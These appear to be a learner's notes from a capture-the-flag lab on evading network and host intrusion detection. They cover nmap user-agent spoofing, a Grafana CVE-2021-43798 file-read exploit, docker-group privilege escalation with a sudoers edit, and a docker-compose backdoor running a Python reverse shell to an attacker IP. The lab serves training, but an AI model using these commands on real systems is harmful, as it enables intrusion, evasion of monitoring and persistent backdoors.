Intrusion detection systems (IDS) are a tool commonly deployed to defend networks by automating the detection of suspicious activity. Where a firewall, anti-virus, or authorisation system may prevent certain activity from occurring on or against IT assets, an IDS will instead monitor activity that isn't restricted and sort the malicious from the benign. IDS commonly apply one of two different detection methodologies; 
- Signature (or rule) based IDS will apply a large rule set to search one or more data sources for suspicious activity whereas
- Anomaly-based(behaviour) IDS establish what is considered normal activity and then raise alerts when an activity that does not fit the baseline is detected.

Either way, once an incident is detected, the IDS will generate an alert and will then forward it further up the security chain to log aggregation or data visualisation platforms like [Graylog](https://www.graylog.org/products/open-source) or the [ELK Stack](https://www.elastic.co/what-is/elk-stack). Some IDS may also feature some form of intrusion prevention technology and may automatically respond to the incident.

Examples:
-  [Suricata](https://suricata.io/), a network-based IDS (NIDS)
-  [Wazuh](https://wazuh.com/), a host-based IDS (HIDS).

Both of these IDS implement the same overarching signature detection methodology; however, their overall behaviour and the types of attacks that they can detect differ greatly.

## **Network-based IDS (NIDS)**
As the name implies, network intrusion detection systems or NIDS monitor networks for malicious activity by checking packets for traces of activity associated with a wide variety of hostile or unwanted activity including:
- Malware command and control  
- Exploitation tools
- Scanning  
- Data exfiltration
- Contact with phishing sites  
- Corporate policy violations

Network-based detection allows a single installation to monitor an entire network which makes NIDS deployment more straightforward than other types. However, NIDS are more prone to generating false positives than other IDS, this is partly due to the sheer volume of traffic that passes through even a small network and, the difficulty of building a rule set that is flexible enough to reliably detect malicious traffic without detecting safe applications that may leave similar traces.

*Note:*
	NIDS rely on having access to all of the communication between nodes and are thus affected by the widespread adoption of in-transit encryption.

Q) What widely implemented protocol has an adverse effect on the reliability of NIDS?
 ``TLS``
## **Reconnaissance and Evasion Basics**
Now that the basics of NIDS have been covered, it's time to discuss some simple evasion techniques in the context of the first stage of the cyber kill chain, reconnaissance. First, run the following command against the target at 10.10.107.199  

`nmap -sV 10.10.107.199`

The above command does not make use of any evasion techniques and as a result, most NIDS should be able to detect it with no issue. Suricata should have detected that some packets contain the default `nmap` user agent and triggered an alert. Suricata will have also detected the unusual HTTP requests that `nmap` makes to trigger responses from applications targeted for service versioning. Wazuh may have also detected the 400 error codes made during the course of the scan.

We can use this information to test our first evasion strategy. By appending the following to change the user_agent `http.useragent=<AGENT_HERE>`, we can set the user agent used by `nmap` to a new value and partially evade detection. Try running the command now, a big list of user agents is available [here](https://developers.whatismybrowser.com/useragents/explore/). The final command should look something like this:

`nmap -sV --script-args http.useragent="<USER AGENT HERE>" 10.10.107.199`  
  
Note, that this strategy isn't perfect as both Suricata and Wazuh are more than capable of detecting the activity from the aggressive scans. Try running the following `nmap` command with the new User-Agent:

`nmap --script=vuln --script-args http.useragent="<USER AGENT HERE>" 10.10.107.199`

The above command tells `nmap` to use the vulnerability detection scripts against the target that can return a wealth of information. However, as you may have noticed they also generate a significant number of IDS alerts even when specifying a different User-Agent as a `nmap` probes for a large number of potential attack vectors. It is also possible to evade detection by using `SYN (-sS)` or "stealth" scan mode; however, this returns much less information as it will not perform any service or version detection.

It is also important to also take note of the position of the target in relation to the network when performing reconnaissance. If the target asset is publicly accessible it may not be necessary to perform any evasion as it is highly likely that the asset is also under attack by a countless number of botnets and internet-wide scans and thus, the activity may be buried undersea by other attacks. On the other hand, publicly exposed assets may also be protected by rate-limiting tools like `fail2ban`. Scanning a site that is under the protection of such a tool is likely to result in your IP getting banned very quickly.

Conversely, if you're scanning an important database behind a corporate firewall that should never be accessed from the outside, a single IDS alert is likely to be the cause of some alarm.

We should also consider the exact definition of evasion as applied to IDS; it can either be complete, where no IDS alerts are triggered as a result of hostile actions, or, partial where an alert is triggered but, its severity is reduced. In some scenarios, complete evasion may be the only option for example, if valuable assets are involved. In other cases partial evasion may be just as good as low severity IDS alerts particularly from, NIDS are much less likely to be investigated, or even forwarded further up the alert management chain. Again, this is reflected by the scoring system as it will take the reliability of each of the attached IDS into account when scoring alerts.

Q) What scale is used to measure alert severity in Suricata? 
	1-3
Q)   How many services is nmap able to fully recognise when the service scan (-sV) is performed?
	3: HTTP / FTP /SSH
## **Further Reconnaissance Evasion**
Of course, `nmap` is not the only tool that features IDS evasion tools. As an example the web-scanner `nikto` also features a number of options that we will experiment with within this task, where we perform more aggressive scans to enumerate the services we have already discovered. In general, `nikto` is a much more aggressive scanner than `nmap` and is thus harder to conceal; however, these more aggressive scans can return more useful information in some cases. Let's start by running `nikto` with the minimum options:

`nikto -p 80,3000 -h 10.10.107.199`

For more details and flags check nikto manual :)

## **Open-source Intelligence**
Most forms of OSINT are affectivity undetectable and thus are extremely effective against IDS however, there are limitations as by its nature, OSINT relies on the target to disclose information which, may not happen if the target isn't publicly available or is designed to reduce data disclosure. A good example of this is the [Wireguard](https://www.wireguard.com/protocol/#dos-mitigation) VPN protocol which will not respond to queries unless they come from an authenticated source making, it invisible to third-party scan sites like ***shodan***.

In terms of information that can be gathered from third parties the following sources may be available as a starting point:  
- Information on the services active on a node can be acquired with tools like Shodan.
- Additional resources may be found using search engines and advanced tags like `:site`, `:filetype` or :`title.`  
- Subdomains and related IP addresses may be found using online scanners or tools like `recon-ng`; a poorly chosen subdomain may also reveal information about the target even if it is protected behind a firewall.  
- ASN and WHOIS queries may reveal what provider is responsible for hosting the site.

Information may also be gathered from the target site and related assets if they are publicly available including:
- The technologies used to host the site may be acquired from error pages, file extensions, debug pages, or the server tag used in an HTTP response;
- Additional information on the tools used by the target may be available in job listings;

Q) What version of Grafana is the server running?
	Grafana is running by default on port 3000 -> v.8.2.5
	
Q) What is the ID of the severe CVE that affects this version of Grafana?
	CVE-2021-43798

Q) If this server was publicly available, What site might have information on its services already?
	shodan

Q) How would we search the site "example.com" for pdf files, using advanced Google search tags?
	`site:example.com filetype:pdf`

## **Rulesets**
Any signature-based IDS is ultimately reliant, on the quality of its ruleset; attack signatures must be well defined, tested, and consistently applied otherwise, it is likely that an attack will remain undetected. It is also important that the rule set be, kept up to date in order to reduce the time between a new exploit being discovered and its signatures being loaded into deployed IDS.  Ruleset development is difficult and, all rule sets especially, ones deployed in NIDS will never completely accurate. Inaccurate rules sets may generate false positives or false negatives with both failures affecting the security of the assets under the protection of an IDS.

In this case, we have identified that one of the target assets is affected by a critical vulnerability which, will allow us to by-parse authentication and gain read access to almost any file on the system. It's been a while since this [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2021-43798) was made public so its signature is available in the Emerging Threats Open ruleset which is loaded by default in Suricata. Let's run this exploit and see if we are detected;

https://github.com/jas502n/Grafana-CVE-2021-43798

`wget https://raw.githubusercontent.com/Jroo1053/GrafanaDirInclusion/master/src/exploit.py`

`python3 exploit.py -u 10.10.107.199 -p 3000 -f <REMOTE FILE TO READ>`

Q) What is the password of the grafana-admin account?
	`python3 exploit.py -u 10.10.107.199 -p 3000 -f /etc/grafana/grafana.ini | grep 'password'`

## **Host Based IDS (HIDS)**
Not all forms of malicious activity involve network traffic that could be detected by a NIDS, ransomware, for example, could be disturbed via an external email service provider installed and executed on a target machine and, only be detected by a NIDS once, it calls home with messages of its success which, of course, is way too late. For this reason, it is often advisable to deploy a host-based IDS alongside a NIDS to check for suspicious activity that occurs on devices and not just over the network including:
- Malware execution;
- System configuration changes;
- Software errors;
- File integrity changes;
- Privilege escalation;

HIDS deployment can be a lot more complex than NIDS as they often require the installation and management of an agent on each host intended to be covered by the HIDS. This agent typically forwards activity from the data sources on the system to a central management and processing node which then applies the rules to the forwarded data in a manner similar to any other IDS. These data sources typically include:
- Application and system log files.
- The Windows registry.
- System performance metrics.
- The state of the file system itself.

This can be hard to manage in a large environment without some form of automated deployment mechanism, like Ansible. It is also often necessary to perform additional configuration work when first deploying a HIDS as the default options are likely to miss certain applications. For example, to create this demo deployment I built custom docker images for each service that was monitored by the HIDS and configured the agent to read from each services log file, performing this for every containerised service on a real network and managing updates would quickly get out of hand unless automation was deployed.

The primary difference between HIDS and NIDS is the types of activity that they can detect. A HIDS will not typically have access to a log of network traffic and is, therefore, unable to detect certain forms of activity at all or will only be able to detect more aggressive activity.

## **Privilege Escalation Recon**
This is primarily a task for HIDS as many post-exploitation tasks like, privilege escalation do not require communication with the outside world and are hard or impossible to detect with a NIDS. In fact, privilege escalation is our first task as we are not yet root. The first step in privilege escalation is usually checking what permissions we currently have this, could save us a lot of work if we're already in the sudo group. There are a few different ways to check this including:

- `sudo -l` this will return a list of all the commands that an account can run with elevated permissions via `sudo`
- `groups` will list all of the groups that the current user is a part of.
- `cat /etc/group` should return a list of all of the groups on the system and their members. This can help in locating users with higher access privileges and not just our own.

Suricata is capable of detecting when scripts are downloaded via `wget`  , however, TLS restricts its ability to actually detect the traffic without the deployment of web proxy servers. It may also be possible to simply copy and paste the script's content however, most HIDS implement some form of file system integrity monitoring which would detect the addition of the script even if an antivirus was not installed;

## **Performing Privilege Escalation**
The last task allowed us to identify Docker as a potential privilege escalation vector. Now it's time to perform the escalation itself. First, though, I should explain how this particular privilege escalation works. In short, this attack leverages a commonly suggested [workaround](https://stackoverflow.com/questions/48568172/docker-sock-permission-denied) that allows non-root users to run docker containers. The workaround requires adding a non-privileged user to the `docker`group which, allows that user to run containers without using `sudo` or having root privileges. However, this also grants effective root-level privileges to the provided user, as they are able to spawn containers without restriction.

We can use these capabilities to gain root privileges quite easily try and run the following with the `grafana-admin` account:

`docker run -it --entrypoint=/bin/bash -v /:/mnt/ ghcr.io/jroo1053/ctfscoreapache:master`  

This will spawn a container in interactive mode, overwrite the default entry-point to give us a shell, and mount the hosts file system to root.  From within this container, we can then edit one of the following files to gain elevated privileges:

- `/etc/group` We could add the `grafana-admin` account to the root group. Note, that this file is covered by the HIDS  
	`sudo usermod -aG root username`
- `/etc/sudoers` Editing this file would allow us to add the grafana-admin account to the sudoers list and thus, we would be able to run `sudo` to gain extra privileges. Again, this file is monitored by Wazuh.  In this case, we can perform this by running:  
   `echo "grafana-admin ALL=(ALL) NOPASSWD: ALL" >>/mnt/etc/sudoers   `  
- We could add a new user to the system and join the root group via `/etc/passwd` . Again though, this activity is likely to be noticed by the HIDS.
	`sudo usermod -aG admin johndoe`

Q)Perform the privilege escalation and grab the flag in /root/
```
grafana-admin@reversegear:~$ pwd
/home/grafana-admin
grafana-admin@reversegear:~$ whoami
grafana-admin      !!!
grafana-admin@reversegear:~$ sudol -l

Command 'sudol' not found, did you mean:

  command 'sudo' from deb sudo (1.8.31-1ubuntu1.2)
  command 'sudo' from deb sudo-ldap (1.8.31-1ubuntu1.2)

Try: apt install <deb name>

grafana-admin@reversegear:~$ sudo -l
[sudo] password for grafana-admin: 
Sorry, user grafana-admin may not run sudo on reversegear.
grafana-admin@reversegear:~$ docker run -it --entrypoint=/bin/bash -v /:/mnt/ ghcr.io/jroo1053/ctfscoreapache:master    !!!!

root@3b3df5d268cd:/# 
root@3b3df5d268cd:/# whoami
root     !!!!
root@3b3df5d268cd:/# echo "grafana-admin ALL=(ALL) NOPASSWD: ALL" >>/mnt/etc/sudoers          !!!
root@3b3df5d268cd:/# whoami
root     !!!
root@3b3df5d268cd:/# ls
bin   dev  home           lib    lib64   media  opt   root  sbin  sys  usr
boot  etc  initctl_faker  lib32  libx32  mnt    proc  run   srv   tmp  var
root@3b3df5d268cd:/# cd root
root@3b3df5d268cd:~# lls
bash: lls: command not found
root@3b3df5d268cd:~# ls
root@3b3df5d268cd:~# ls -l
total 0
root@3b3df5d268cd:~# cd ..
root@3b3df5d268cd:/# cd home
root@3b3df5d268cd:/home# ls
root@3b3df5d268cd:/home# cd ..
root@3b3df5d268cd:/# cd /mnt   !!!
root@3b3df5d268cd:/mnt# ls
bin   dev  home  lib32  libx32      media  opt   root  sbin  srv       sys  usr
boot  etc  lib   lib64  lost+found  mnt    proc  run   snap  swap.img  tmp  var
root@3b3df5d268cd:/mnt# cd root   !!!
root@3b3df5d268cd:/mnt/root# ls
root.txt  snap
root@3b3df5d268cd:/mnt/root#  cat root.txt  !!! 

```

## **Establishing Persistence**
The compromised host is running Linux so we have a number of persistence mechanisms available to us. The first option which, is arguably the most straightforward is to add a public key that we control to the *authorized_keys* file at `/root/.ssh/`. This would allow us to connect to the host via SSH without needing to run the privilege escalation exploit every time and without relying on the password for the compromised account not changing. This methodology is very common among botnets as it's both reliable and very simple to implement as pretty much all Linux distributions indented for server use run an Open-SSH service by default.

Try this now, a valid key pair can be generated for the attack box by running `ssh-keygen`. Once this key is added to the *authorized_keys* file in `/root/.ssh/` you should be able to gain remote access to root whenever it's needed, simple right? Well, unfortunately, this tactic has one big disadvantage as it is highly detectable.

HIDS often feature some form of file system integrity monitoring service which, will periodically scan a list of target directories for changes with, an alert being raised every time a file is changed or added. By adding an entry to the `authorized_keys` file you would have triggered an alert of a fairly high severity and as a result, this might not be the best option. An alert is also raised every time an ssh connection is made so the HIDS operator will be notified every time we log on.
- **File system monitoring** - As already mentioned this affects our ability to simply install ssh keys but, this also affects other persistence vectors like, `cron`, `systemd` and any attacks that require the installation of additional tools.
- **System log collection** - This functionality will generate alerts when some post-exploitation actions are taken against the system like making SSH connections and login attempts.
- **System inventory** - This tracks system metrics like open ports, network interfaces, packages, and processes. This affects our ability to open new ports for reverse shells and install new packages. Note, that this function currently, does not generate alerts by itself and requires the HIDS operator to write their own rules. However, A report would be available on an upstream log analysis platform like Kibana.

Note, that Docker monitoring is also available, however, it is not enabled in this case which gives us a few options:
- We could hijack the existing container supply chain and use it to install a backdoor into one of the containers that are hosted by the system. This would be difficult to detect without additional container monitoring and scanning technology. Credentials for a docker registry could either be phished or extracted from `/root/.docker/config.json` as, this location stores the credentials used with the `docker login` command in plaintext. This won't work in this case though, as the host we compromised doesn't have internet access and there are no credentials in `/root/.docker/config.json`.
- We could modify the existing docker-compose setup to include a privileged SSH enabled container and mount the host's file system to it with `-v /:/hostOS`. The docker-compose file used to define the current setup isn't monitored by the file system integrity monitor as it's in `/var/lib.` Again though, this won't work well in this case as we don't have access to the internet though, you could transport the container images from the attack box to the compromised VM via SSH. You would also need to open up a new port for the ssh connection which, would show up on the system inventory report.
- We could modify an existing or new docker-compose setup by, abusing the `entrypoint` option to grant us a reverse shell. Using docker-compose also allows us to specify automatic restarts which increases the backdoor's resilience. This option also reverses the typical client-server connection model so, we won't need to open any new ports on the host.

```
version: "2.1"

services:
backdoorservice:
restart: always
image: ghcr.io/jroo1053/ctfscore:master
entrypoint: >  
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect((<ATTACKBOXIP>",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);
pty.spawn("/bin/sh")'

volumes:
- /:/mnt

privileged: true
```

This will create a new docker container using an image that's already available on the system, mount the entire host file system to `/mnt/`on the container and spawn a reverse shell with python. 
`nc -lvnp 4242`

Then start the service on the host with:
`docker-compose up`  

Once these are performed you should have a way to access the vulnerable host without relying on SSH, a vulnerable service, or user credentials. Of course, you will still be able to use these other methods in conjunction with the docker-compose reverse shell as, backups.

Q) Abuse docker to establish a backdoor on the host system.

- find / -type f -name docker-compose.yml
- nano /mnt/var/lib/ctf/docker-compose.yml
- append : 
	`version: "2.1"`
	`services:`
	`backdoorservice:`
	`restart: always`
	`image: ghcr.io/jroo1053/ctfscore:master`
	`entrypoint: >`  
	`python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);`
	`s.connect(("10.10.48.75",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);`
	`pty.spawn("/bin/sh")'`
	
	`volumes:`
	`- /:/mnt`
	
	`privileged: true`

- nc -nvlp 4444